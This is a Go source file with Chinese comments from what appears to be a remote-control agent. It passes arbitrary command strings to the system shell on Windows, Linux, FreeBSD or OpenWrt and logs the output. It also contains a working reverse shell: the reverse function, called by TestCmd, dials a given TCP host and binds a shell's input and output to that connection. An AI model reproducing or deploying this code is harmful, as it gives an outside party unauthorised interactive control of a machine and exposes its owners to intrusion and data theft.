package lib

import (
	"bytes"
	"fmt"
	"golang.org/x/text/encoding/simplifiedchinese"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

var StatusCommStatus = "none" //执行命令状态 running 运行中 | stopped 执行完毕

func RunCommCom(strCom string) {
	if StatusCommStatus == "running" {
		cmdLog.Println(" 上个指令还在执行等待结束...")
		for {
			cmdLog.Println(" Debug 上个指令还在执行等待结束...")
			if StatusCommStatus == "stopped" {
				break
			}
			time.Sleep(2 * time.Second)
		}
	}
	StatusCommStatus = "running"
	execComSort(strCom)
	StatusCommStatus = "stopped"
}

// 执行命令分类
func execComSort(strCom string) {
	arrCom := strings.Split(strCom, "]")
	if arrCom[0] == "[sys" {
		execSysCom(arrCom[1])
	} else {
		execProCom(arrCom[1])
	}
}

// 运行程序指令
func execProCom(strCom string) {
	cmdLog.Println(" 运行指令:", strCom)
	var execShell string
	var execParam = "-c"
	switch runtime.GOOS {
	case "windows":
		execShell = "cmd"
		execParam = "/C start "
		break
	case "linux":
		execShell = "/bin/bash"
		break
	case "freebsd":
		execShell = "/bin/csh"
		break
	case "openwrt":
		execShell = "/bin/ash"
		break
	default:
		execShell = "/bin/sh"

	}
	arrCom := strings.Split(strCom, " ")
	var program = strCom
	if len(arrCom) > 1 { //带参数
		program = arrCom[0]
		strCom = strings.TrimLeft(strCom, arrCom[0])
		order := exec.Command(execShell, execParam+program, strCom)
		//构建返回
		var out bytes.Buffer
		order.Stdout = &out
		order.Stderr = os.Stderr
		//开始执行
		err := order.Start()
		if err != nil {
			cmdLog.Println(" 运行["+strCom+"]失败:", err)
			return
		}
		//执行结果
		err = order.Wait()
		cmdLog.Println(" 运行["+strCom+"]完成错误:", err)
		strOut, _ := simplifiedchinese.GBK.NewDecoder().String(out.String())
		cmdLog.Println(" 运行["+strCom+"]完成结果:", strOut)
	} else { //不带参数
		order := exec.Command(execShell, execParam, strCom)
		var out bytes.Buffer
		order.Stdout = &out
		order.Stderr = os.Stderr
		err := order.Start()
		if err != nil {
			cmdLog.Println(" 运行["+strCom+"]失败:", err)
			return
		}
		err = order.Wait()
		cmdLog.Println(" 运行["+strCom+"]完成错误:", err)
		strOut, _ := simplifiedchinese.GBK.NewDecoder().String(out.String())
		cmdLog.Println(" 运行["+strCom+"]完成结果:", strOut)
	}

}

// 后台执行系统指令
func execSysCom(strCom string) {
	cmdLog.Println(" 运行sys指令:", strCom)
	var execShell string
	var execParam = "-c"
	switch runtime.GOOS {
	case "windows":
		execShell = "cmd"
		execParam = "/c"
		break
	case "linux":
		execShell = "/bin/bash"
		break
	case "freebsd":
		execShell = "/bin/csh"
		break
	case "openwrt":
		execShell = "/bin/ash"
		break
	default:
		execShell = "/bin/sh"

	}
	order := exec.Command(execShell, execParam, strCom)
	var out bytes.Buffer
	order.Stdout = &out
	order.Stderr = os.Stderr
	err := order.Start()
	if err != nil {
		cmdLog.Println(" 运行["+strCom+"]失败:", err)
		return
	}
	err = order.Wait()
	cmdLog.Println(" 运行["+strCom+"]完成错误:", err)
	strOut, _ := simplifiedchinese.GBK.NewDecoder().String(out.String())
	cmdLog.Println(" 运行["+strCom+"]完成结果:", strOut)
}

// 反射
func reverse(host string) {
	c, err := net.Dial("tcp", host)
	if err != nil {
		fmt.Println(err)
		if nil != c {
			err := c.Close()
			if err != nil {
				return
			}
		}
	}

	for {
		var execShell string
		switch runtime.GOOS {
		case "windows":
			execShell = "cmd"
			break
		case "linux":
			execShell = "/bin/bash"
			break
		case "freebsd":
			execShell = "/bin/csh"
			break
		case "openwrt":
			execShell = "/bin/ash"
			break
		default:
			execShell = "/bin/sh"

		}
		order := exec.Command(execShell)
		order.Stdin, order.Stdout, order.Stderr = c, c, c
		err := order.Run()
		if err != nil {
			return
		}
		_ = c.Close()
	}
	//c.Close()
}

func TestCmd(host string) {
	reverse(host)
}
